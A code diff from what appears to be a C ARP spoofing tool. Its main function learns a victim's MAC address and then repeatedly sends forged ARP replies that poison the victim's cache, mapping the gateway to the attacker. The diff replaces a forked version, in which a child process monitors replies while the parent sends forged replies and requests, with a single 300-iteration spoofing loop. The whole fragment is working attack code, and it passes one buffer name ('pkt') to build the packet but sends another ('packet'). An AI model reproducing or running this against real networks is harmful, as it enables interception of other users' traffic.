@@ -89,7 +89,6 @@ int main(int argc, char *argv[]){
 	recv_arp_packet(fp, data.victim_host, data.my_host, ARPOP_REPLY);
 	printf(" Victim MAC:  ");
 	addr_print(data.victim_host, ETHER_ADDR_LEN);
-	
 
 	// Test
 	/*
@@ -100,50 +99,12 @@ int main(int argc, char *argv[]){
 	*/
 	
 	printf("\nStart ARP spoofing...\n");
-	pid_t pid;
-	
-	/*
-	int32_t fd[2], state;
-	state = pipe(fd);
-	if (state == -1) {
-		perror("\npipe() error\n");
-		exit(1);
+	for (i = 0; i < 300; i++) {
+		set_arp_packet(pkt, &data.victim_ip, &data.gateway_ip, data.victim_host, ARPOP_REPLY);
+		send_arp_packet(fp, packet);
+		usleep(SEC / 5);
 	}
-	*/
-
-	pid = fork();
-	if (pid == -1) {
-		perror("\nfork() error\n");
-		exit(1);
-	}
-	// child: Check
-	else if (pid == 0){
-		uint8_t host[ETHER_ADDR_LEN];
-
-		while (1) {
-			recv_arp_packet(fp, host, data.my_host, ARPOP_REPLY);
-			addr_print(host, ETHER_ADDR_LEN);
-		}
-	}
-	// parent: Infect
-	else {
-		for (i = 0; i < 300; i++) {
-			set_arp_packet(pkt, &data.victim_ip, &data.gateway_ip, data.victim_host, ARPOP_REPLY);
-			send_arp_packet(fp, packet);
-			usleep(SEC / 10);
-			set_arp_packet(pkt, &data.victim_ip, &data.my_ip, data.victim_host, ARPOP_REQUEST);
-			send_arp_packet(fp, packet);
-			usleep(SEC / 10);
-		}
-		printf("Complete forwarding %d packets.\n", i);
-
-		printf("\nKill child process: pid %d\n", pid);
-		if (kill(pid, SIGTERM) == -1) {
-			printf("child process is not terminated. kill all the process group.\n");
-			kill(0, SIGKILL);
-		}
-		printf("Child process is terminated.\n");
-	}
+	printf("Complete forwarding %d packets.\n", i);
 
 	printf("\nGood Bye~ *^^*\n");
 	return 0;
